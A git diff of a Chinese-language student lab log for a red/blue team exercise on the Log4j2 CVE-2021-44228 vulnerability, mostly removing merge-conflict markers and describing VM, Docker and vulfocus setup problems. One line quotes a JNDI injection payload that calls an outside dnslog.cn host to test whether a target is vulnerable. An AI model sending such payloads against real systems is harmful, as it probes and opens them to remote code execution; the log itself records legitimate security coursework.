@@ -24,18 +24,12 @@ Ani
 
 #### 负责工作
 
-<<<<<<< HEAD
-- 作为红队完成对漏洞的存在性检验以及实现漏洞利用
-- 作为蓝队完成漏洞利用的缓解
-- 实现自动化脚本
-=======
 - Log4j2 CVE-2021-44228
   - 漏洞存在性检验
   - 漏洞可利用性
   - 漏洞利用效果
   - 漏洞利用检验
   - 漏洞利用缓解与修复
->>>>>>> ceea5a9 (update)
 
 #### 学习相关课程和资料
 
@@ -66,11 +60,8 @@ Ani
 
 #### 课程记录 & 实验记录
 
-<<<<<<< HEAD
-=======
 主要是补充一些实验报告中没有提到或者简单带过的 `bug`
 
->>>>>>> ceea5a9 (update)
 7.20 重置电脑，重装系统，删除了以往的文件和配置并对 C 盘和 D 盘进行重新分配
 
 7.21 配置虚拟机环境
@@ -132,11 +123,7 @@ emm 后面做着做着虚拟机挂了，直接打不开了，下了 `virtualbox`
 
 ![duochong](img/duochong.png)
 
-<<<<<<< HEAD
-7.23-7.28
-=======
 7.23-8.2
->>>>>>> ceea5a9 (update)
 
 - 使用 `ssh-copy-id` 进行免密登录的配置
 
@@ -180,13 +167,9 @@ docker cp 容器名：路径+文件 保存路径
 
 使用 `PoC` 手动测试` ${jndi:ldap://0qxc3d.dnslog.cn/exp` ，域名改为 [DNSLog.cn](http://www.dnslog.cn/) 中随机生成的
 
-<<<<<<< HEAD
-然后这里做着做着各种报错：
-=======
 然后这里做着做着，新建了虚拟机 `kali-attacker`，然后因为 `VMware` 没有双重加载的功能，然后我就将虚拟硬盘复制的副本作为这台新建的虚拟机的虚拟硬盘导入，然后就开始打不开第一台虚拟机。删去新建的虚拟机之后，原虚拟机可以重新打开，但是可能配置丢失，无法正常打开 `vulfocus` 界面了
 
 后面换成了 `VirtualBox` 重新做前面的环境配置，但是在 `vulfocus` 镜像管理页面无法正常同步，且一直显示 `服务器内部错误，请联系管理员` 的报错：
->>>>>>> ceea5a9 (update)
 
 ![bug](img/bug.png)
 
@@ -216,15 +199,11 @@ docker cp 容器名：路径+文件 保存路径
 
 查看日志后说是 `docker` 启动的问题
 
-<<<<<<< HEAD
-于是尝试了各种方法，诸如
-=======
 于是尝试了各种方法，诸如参考
 
 [Docker-docke 服务启动报错：Job for docker.service failed because the control process exited with error code.](https://blog.csdn.net/MinggeQingchun/article/details/123344229)
 
 [docker 启动报错：Failed to start Docker Application Container Engine](https://blog.csdn.net/u010918487/article/details/106925282)
->>>>>>> ceea5a9 (update)
 
 更改至 `root` 下执行相关命令，修改下列文件配置等等
 
@@ -232,13 +211,6 @@ docker cp 容器名：路径+文件 保存路径
 
 但问题还是没得到解决
 
-<<<<<<< HEAD
-5. 评估漏洞利用效果
-
-
-
-
-=======
 后面大致是确定因为 `vulfocus` 版本的问题导致的无法同步，然后直接使用官方的仓库配置环境，结果还是不能同步
 
 最后找到了 [新版的 vulfocus](https://github.com/fofapro/vulfocus/tree/master) 作为参考，修改了容器内 `vulfocus-api` 下的 `views.py` 配置文件
@@ -324,4 +296,3 @@ docker cp 容器名：路径+文件 保存路径
 8.6
 
 补充流量检验
->>>>>>> ceea5a9 (update)
